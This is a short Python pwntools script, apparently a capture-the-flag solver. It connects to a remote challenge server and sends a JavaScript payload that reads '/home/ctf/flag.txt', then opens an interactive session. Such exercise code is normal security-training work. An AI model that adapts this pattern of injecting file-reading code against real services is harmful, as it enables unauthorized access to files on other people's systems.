#!/usr/bin/env python3

from pwn import *

# with open("./pwn.js", "rb") as f:
#     payload = f.read()

io = remote("13.201.224.182", 30206)

payload = "console.log(read('/home/ctf/flag.txt'))"
io.sendline(str(len(payload)).encode())
io.send(payload)

io.interactive()
